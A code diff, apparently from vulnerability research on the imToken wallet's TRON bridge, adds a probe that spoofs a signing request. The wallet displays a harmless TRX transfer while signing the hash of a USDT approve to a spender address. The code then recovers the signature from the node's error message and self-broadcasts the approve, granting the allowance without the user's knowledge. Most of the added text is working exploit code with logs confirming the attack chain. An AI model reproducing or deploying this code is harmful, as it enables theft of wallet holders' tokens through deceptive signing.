@@ -74,6 +74,7 @@
       <button class="btn btn-probe" id="btnProbeTypeOverride" style="background:#7d3c98;">⑧ type覆盖探针（决定性：节点凭type还是type_url）</button>
       <button class="btn btn-probe" id="btnProbeSignBroadcast" style="background:#a83232;">⑨ 签名分离+自广播探针（signTransaction·最可能成立）</button>
       <button class="btn btn-probe" id="btnProbeBroadcastSrc" style="background:#1f6f5c;">⑩ 广播来源判定（sendTransaction 发 raw_data 还是 raw_data_hex）</button>
+      <button class="btn btn-probe" id="btnProbeSigRecover" style="background:#c0392b;font-weight:700;">⑪ 签名回收+自广播（完整WYSINWYS·显transfer/链上approve）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -1212,6 +1213,131 @@
       }
     } catch (e) {
       log('广播来源判定探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
+  // ==================== ⑪ 签名回收 + 自广播（完整 WYSINWYS via sendTransaction） ====================
+  // 统一模型（⑥⑦⑧⑩ 自洽）：sendTransaction 签 sha256(raw_data_hex)（不跑 ce、不校验与 raw_data 一致），
+  // 广播用 raw_data(JSON)，显示读 raw_data。⇒ 显示 transfer 而签 approve 字节，
+  // 且节点 SIGERROR 报错里【回显了该签名】。据此：
+  //   1) 让 imToken 显示 transfer、签 approve 的哈希 → 从报错抠出签名
+  //   2) DApp 用未被重写的 sendRawTransaction 自广播【approve + 该签名】→ 节点验签通过 → approve 上链
+  // 因为 sha256(raw_data_hex_approve)==txID_approve==节点对 approve 重算的哈希，签名必然校验通过。
+  function parseSigFromError(msg) {
+    if (!msg) return null;
+    var s = String(msg);
+    // 形如 "Validate signature error: <SIG_HEX> is signed by <ADDR>"
+    var m = s.match(/([0-9a-fA-F]{120,})\s+is signed by/);
+    if (m) return m[1];
+    // 兜底：取最长的十六进制串
+    var all = s.match(/[0-9a-fA-F]{120,}/g);
+    if (all && all.length) return all.sort(function(a,b){return b.length-a.length;})[0];
+    return null;
+  }
+
+  async function runProbeSigRecover() {
+    if (!window.imToken || typeof window.imToken.callPromisifyAPI !== 'function') { log('imToken 桥未就绪', 'error'); return; }
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 签名回收 + 自广播（完整 WYSINWYS） ══════════', 'warn');
+    log('显示 transfer / imToken 签 approve 哈希 / 从节点报错抠签名 / DApp 自广播 approve', 'warn');
+    log('═══════════════════════════════════════════════════', 'warn');
+
+    try {
+      // 1) 真 approve（执行目标）。注意 sha256(raw_data_hex)==txID
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        window.tronWeb.address.toHex(USDT_CONTRACT), 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        window.tronWeb.address.toHex(walletAddr)
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      log('[目标] approve txID = ' + approveTx.txID, 'warn');
+      log('[目标] sha256(raw_data_hex)==txID（tronWeb 构造，必然成立）→ 签名将锚定此哈希', 'success');
+
+      // 2) 真 transfer（仅显示）
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+
+      // 3) 错位请求：显示 transfer，但 raw_data_hex/txID = approve（imToken 将签 approve 哈希）
+      var signReq = {
+        visible: transferBuilt.visible,
+        txID: approveTx.txID,                 // = approve 哈希（imToken 签 sha256(raw_data_hex)=此值）
+        raw_data: transferBuilt.raw_data,     // 显示层 → transfer
+        raw_data_hex: approveTx.raw_data_hex  // 被签字节 → approve
+      };
+      log('★ 弹窗应显示“转账 TRX”（读 raw_data）；实际签的是 approve 字节。请确认显示。', 'warn');
+
+      // 4) 调 sendTransaction：内部广播(raw_data=transfer)必失败，但报错回显签名
+      var recoveredSig = null;
+      var rawReturn = null;
+      try {
+        rawReturn = await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+          tx: signReq, from: walletAddr, useTronHeader: true
+        });
+        log('sendTransaction 意外返回(未抛错): ' + JSON.stringify(rawReturn), 'warn');
+        // 某些版本可能直接返回签名/签名后的 tx
+        recoveredSig = (rawReturn && (Array.isArray(rawReturn.signature) ? rawReturn.signature[0] : rawReturn.signature)) || null;
+        if (!recoveredSig) recoveredSig = parseSigFromError(JSON.stringify(rawReturn));
+      } catch (e) {
+        var msg = String(e && (e.message || e));
+        log('sendTransaction 抛错(预期, 内部广播 transfer 失败): ' + msg, 'warn');
+        recoveredSig = parseSigFromError(msg);
+        // 也尝试从 error 对象的其它字段抠
+        if (!recoveredSig) { try { recoveredSig = parseSigFromError(JSON.stringify(e, Object.getOwnPropertyNames(e))); } catch (x) {} }
+      }
+
+      if (!recoveredSig) {
+        log('未能从返回/报错中回收签名。请把上面这行 sendTransaction 的完整返回/报错原文贴给我，我据此适配。', 'error');
+        return;
+      }
+      log('[回收] 取得签名(' + recoveredSig.length + '): ' + recoveredSig.slice(0, 40) + ' …', 'success');
+
+      // 5) DApp 自广播：真 approve + 回收的签名（直连 TronGrid，绕过 imToken）
+      var broadcastTx = {
+        visible: approveTx.visible,
+        txID: approveTx.txID,
+        raw_data: approveTx.raw_data,
+        raw_data_hex: approveTx.raw_data_hex,
+        signature: [recoveredSig]
+      };
+      log('[自广播] approve raw_data + 回收签名 → /wallet/broadcasttransaction …', 'warn');
+      var d = await postRawToNode(broadcastTx, '自广播approve(回收签名)');
+
+      $('probeResultCard').style.display = 'block';
+      var ok = d && (d.result === true || d.txid);
+      if (ok) {
+        var txid = d.txid || approveTx.txID;
+        $('probeTxid').textContent = txid;
+        $('probeOnchainType').textContent = '查询中…';
+        log('✅✅ 自广播被节点接受！txid=' + txid, 'error');
+        var onchainType = await fetchOnchainTypeRetry(txid, 5);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴🔴 完整 WYSINWYS 成立：显transfer·链上approve';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = 'sendTransaction 跳过 ce，签了 approve 字节(sha256(raw_data_hex))却显示 transfer；节点 SIGERROR 回显该签名；DApp 用未被重写的 sendRawTransaction 自广播 approve+签名 → 验签通过、approve 上链。<strong>用户只看到转账，授权已生效。</strong>';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('🔴 approve 已上链，且 imToken 弹窗显示的是转账 → 攻击链完整闭合', 'error');
+          await queryAndShowAllowance(false);
+        } else {
+          $('probeVerdict').textContent = '⚠️ 已上链，类型=' + (onchainType || '待确认');
+          log('链上类型: ' + (onchainType || '待确认'), 'warn');
+        }
+      } else if (d && (d.code || d.Error || d.message)) {
+        var em = '';
+        try { em = d.message ? window.tronWeb.toUtf8(d.message) : ''; } catch (e) { em = d.message || ''; }
+        log('自广播被拒: code=' + (d.code || '') + ' Error=' + (d.Error || '') + ' msg=' + em, 'error');
+        if (((d.Error || '') + ' ' + em).toLowerCase().indexOf('sign') !== -1 || (em || '').indexOf('permission') !== -1) {
+          log('→ 回收的签名未通过 approve 验签：说明 imToken 签的哈希 ≠ sha256(raw_data_hex)；需重审签名口径。', 'warn');
+        }
+      } else {
+        log('自广播返回无法判定: ' + JSON.stringify(d), 'warn');
+      }
+    } catch (e) {
+      log('签名回收探针异常: ' + (e.message || e), 'error');
     }
   }
 
